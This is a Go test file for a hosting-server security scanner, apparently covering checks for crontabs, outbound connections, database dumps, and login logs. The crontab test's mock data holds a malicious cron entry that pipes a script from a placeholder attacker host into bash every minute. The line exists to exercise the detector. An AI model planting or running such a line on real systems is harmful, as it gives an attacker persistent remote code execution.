package checks

import (
	"context"
	"os"
	"testing"
	"time"

	"github.com/pidginhost/csm/internal/config"
	"github.com/pidginhost/csm/internal/state"
)

// --- CheckOutboundUserConnections ------------------------------------

func TestCheckOutboundUserConnectionsNoTCP(t *testing.T) {
	withMockOS(t, &mockOS{})
	findings := CheckOutboundUserConnections(context.Background(), &config.Config{}, nil)
	if len(findings) != 0 {
		t.Errorf("no /proc/net/tcp should return 0, got %d", len(findings))
	}
}

func TestCheckOutboundUserConnectionsSafe(t *testing.T) {
	// All connections to safe ports (443) from root (uid 0)
	tcpData := "  sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt   uid\n" +
		"   0: 0100007F:0050 C0A80001:01BB 01 00000000:00000000 00:00000000 00000000     0\n"
	withMockOS(t, &mockOS{
		readFile: func(name string) ([]byte, error) {
			if name == "/proc/net/tcp" {
				return []byte(tcpData), nil
			}
			return nil, os.ErrNotExist
		},
	})

	findings := CheckOutboundUserConnections(context.Background(), &config.Config{}, nil)
	if len(findings) != 0 {
		t.Errorf("root connections to safe ports should return 0, got %d", len(findings))
	}
}

// --- CheckCrontabs ---------------------------------------------------

func TestCheckCrontabsNoCrontab(t *testing.T) {
	withMockOS(t, &mockOS{
		glob: func(pattern string) ([]string, error) {
			return nil, nil
		},
	})
	withMockCmd(t, &mockCmd{})

	store, err := state.Open(t.TempDir())
	if err != nil {
		t.Fatal(err)
	}
	defer func() { _ = store.Close() }()

	findings := CheckCrontabs(context.Background(), &config.Config{}, store)
	if len(findings) != 0 {
		t.Errorf("no crontabs should produce 0, got %d", len(findings))
	}
}

func TestCheckCrontabsWithData(t *testing.T) {
	withMockOS(t, &mockOS{
		glob: func(pattern string) ([]string, error) {
			return []string{"/var/spool/cron/alice"}, nil
		},
		readFile: func(name string) ([]byte, error) {
			return []byte("* * * * * curl http://evil.example/payload.sh | bash\n"), nil
		},
	})

	store, err := state.Open(t.TempDir())
	if err != nil {
		t.Fatal(err)
	}
	defer func() { _ = store.Close() }()

	// Exercises the full function path including hash comparison.
	_ = CheckCrontabs(context.Background(), &config.Config{}, store)
}

// --- CheckDNSConnections ---------------------------------------------

func TestCheckDNSConnectionsNoProcNet(t *testing.T) {
	withMockOS(t, &mockOS{})
	findings := CheckDNSConnections(context.Background(), &config.Config{}, nil)
	if len(findings) != 0 {
		t.Errorf("no /proc/net should produce 0, got %d", len(findings))
	}
}

// --- CheckDatabaseDumps ----------------------------------------------

func TestCheckDatabaseDumpsNoGlob(t *testing.T) {
	withMockOS(t, &mockOS{
		glob: func(pattern string) ([]string, error) {
			return nil, nil
		},
	})
	findings := CheckDatabaseDumps(context.Background(), &config.Config{}, nil)
	if len(findings) != 0 {
		t.Errorf("no dumps should produce 0, got %d", len(findings))
	}
}

func TestCheckDatabaseDumpsWithGlob(t *testing.T) {
	withMockOS(t, &mockOS{
		glob: func(pattern string) ([]string, error) {
			return []string{"/home/alice/public_html/backup.sql.gz"}, nil
		},
		stat: func(name string) (os.FileInfo, error) {
			return fakeFileInfo{name: "backup.sql.gz", size: 50 * 1024 * 1024}, nil
		},
	})
	// Exercises the glob + stat path. May or may not produce findings
	// depending on internal time/size thresholds.
	_ = CheckDatabaseDumps(context.Background(), &config.Config{}, nil)
}

// --- CheckMailQueue ---------------------------------------------------

func TestCheckMailQueueNoExim(t *testing.T) {
	withMockCmd(t, &mockCmd{
		run: func(name string, args ...string) ([]byte, error) {
			return nil, os.ErrNotExist
		},
	})
	cfg := &config.Config{}
	cfg.Thresholds.MailQueueWarn = 100
	cfg.Thresholds.MailQueueCrit = 500
	findings := CheckMailQueue(context.Background(), cfg, nil)
	if len(findings) != 0 {
		t.Errorf("no exim should produce 0, got %d", len(findings))
	}
}

// --- CheckSSHDConfig --------------------------------------------------

func TestCheckSSHDConfigNoFile(t *testing.T) {
	withMockOS(t, &mockOS{})
	store, err := state.Open(t.TempDir())
	if err != nil {
		t.Fatal(err)
	}
	defer func() { _ = store.Close() }()

	findings := CheckSSHDConfig(context.Background(), &config.Config{}, store)
	// No sshd_config = no findings (can't check)
	_ = findings
}

// --- CheckGroupWritablePHP -------------------------------------------

func TestCheckGroupWritablePHPNoHome(t *testing.T) {
	withMockOS(t, &mockOS{
		readFile: func(name string) ([]byte, error) {
			if name == "/etc/group" {
				return []byte("www-data:x:33:\napache:x:48:\n"), nil
			}
			return nil, os.ErrNotExist
		},
		readDir: func(name string) ([]os.DirEntry, error) {
			return nil, os.ErrNotExist
		},
	})
	findings := CheckGroupWritablePHP(context.Background(), &config.Config{}, nil)
	if len(findings) != 0 {
		t.Errorf("no home dirs should produce 0, got %d", len(findings))
	}
}

// --- CheckOutboundPasteSites -----------------------------------------

func TestCheckOutboundPasteSitesNoProcNet(t *testing.T) {
	withMockOS(t, &mockOS{})
	findings := CheckOutboundPasteSites(context.Background(), &config.Config{}, nil)
	if len(findings) != 0 {
		t.Errorf("no /proc/net should produce 0, got %d", len(findings))
	}
}

// --- CheckFTPLogins ---------------------------------------------------

func TestCheckFTPLoginsNoLog(t *testing.T) {
	withMockOS(t, &mockOS{})
	findings := CheckFTPLogins(context.Background(), &config.Config{}, nil)
	if len(findings) != 0 {
		t.Errorf("no log should produce 0, got %d", len(findings))
	}
}

// --- CheckWebmailLogins ----------------------------------------------

func TestCheckWebmailLoginsNoLog(t *testing.T) {
	withMockOS(t, &mockOS{})
	cfg := &config.Config{}
	findings := CheckWebmailLogins(context.Background(), cfg, nil)
	if len(findings) != 0 {
		t.Errorf("no log should produce 0, got %d", len(findings))
	}
}

// --- CheckAPIAuthFailures --------------------------------------------

func TestCheckAPIAuthFailuresNoLog(t *testing.T) {
	withMockOS(t, &mockOS{})
	findings := CheckAPIAuthFailures(context.Background(), &config.Config{}, nil)
	if len(findings) != 0 {
		t.Errorf("no log should produce 0, got %d", len(findings))
	}
}

// --- CheckMySQLUsers --------------------------------------------------

func TestCheckMySQLUsersNoMySQL(t *testing.T) {
	withMockCmd(t, &mockCmd{})
	store, err := state.Open(t.TempDir())
	if err != nil {
		t.Fatal(err)
	}
	defer func() { _ = store.Close() }()
	findings := CheckMySQLUsers(context.Background(), &config.Config{}, store)
	if len(findings) != 0 {
		t.Errorf("no mysql should produce 0, got %d", len(findings))
	}
}

// --- fakeFileInfo for stat mocking -----------------------------------

type fakeFileInfo struct {
	name string
	size int64
}

func (f fakeFileInfo) Name() string       { return f.name }
func (f fakeFileInfo) Size() int64        { return f.size }
func (f fakeFileInfo) Mode() os.FileMode  { return 0644 }
func (f fakeFileInfo) ModTime() time.Time { return time.Now() }
func (f fakeFileInfo) IsDir() bool        { return false }
func (f fakeFileInfo) Sys() interface{}   { return nil }
